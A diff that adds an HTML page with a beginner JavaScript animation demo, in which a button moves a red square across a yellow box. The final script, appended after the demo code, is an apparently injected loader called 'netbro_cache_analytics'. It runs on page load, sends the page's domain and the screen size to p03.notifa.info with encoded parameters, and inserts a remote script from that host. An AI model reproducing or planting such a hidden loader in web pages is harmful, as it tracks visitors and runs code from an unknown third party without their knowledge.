@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+<style>
+#container {
+  width: 400px;
+  height: 400px;
+  position: relative;
+  background: yellow;
+}
+#animate {
+  width: 50px;
+  height: 50px;
+  position: absolute;
+  background-color: red;
+}
+</style>
+<body>
+
+<p>
+<button onclick="myMove()">Click Me</button>
+</p> 
+
+<div id ="container">
+<div id ="animate"></div>
+</div>
+
+<script>
+	function myMove() {
+	  var elem = document.getElementById("animate");   
+	  var pos = 0;
+	  var id = setInterval(frame, 5);
+	  function frame() {
+	    if (pos == 350) {
+	      clearInterval(id);
+	    } else {
+	      pos++; 
+	      elem.style.top = pos + 'px'; 
+	      elem.style.left = pos + 'px'; 
+	    }
+	  }
+	}
+</script>
+
+<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncX1ZNloVoH39dWhsIbJbcoYU1%2bJ5Qws8p73e6cTZC6LQ%2bsjslM%2f3xQ4HpEAT39tf%2f0pSy1cCQsFDcO%2b%2bp8FJUKHkMSb3VfDbny1I5oeb17V3mf7FAVDNrEy7cWF%2b6Oum6UtlKNnbPd2tqjI3KtIIOAZKCvMbQT5Wu8oXeGtoGRMhPTznaPto62z13xGSIX5ZWWdXXLRm4%2f%2fRmGUt4TD02boKndbfQ%2f52RP69OJPpIajiUcUaY92EYvSwd%2b80HqKkArDXNl61G4AoeclUsGcywSe9Jf0pQpedJm%2bj2HAoQGkcEPs8Ew0pdkh5FX%2fimhrsGklymAl7vsq3RAKlnJvZNOIhHaE4S4Z30RniXcLe3lWc%2fQ%2fmnGQ3YCH%2baDimYJxrNAc9tgXIOKq7vOtGIrWaqyeiBXqwU6DizqRAkBV1PMEh4kRHXOeQodRoPJIeaGhTFyAQDp%2fT0hxpZ5hSJLujQ1a0Y36HAC4IgeYSsCgl6GO4jvV9SXADxb9YpNuP6dVvZZ8q1rzajPVU2Ak1bK4aFKaKg3RkG%2bpe2pL1pVHSbr7h0P%2b5z8JpwTsvcVLATCClT3zwsI%2bBHuosMuwiLiAjrIDIwheeYJ2KGn%2bTz1%2bh4jzxWkJDQWWrq0yZL3pnwJU5wUmtgknxvQ4EKLZWciDHEy6YNr8FcMvmBY2%2bcnRVd%2fKJqjm5PqEY9K%2bQ%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+</html>
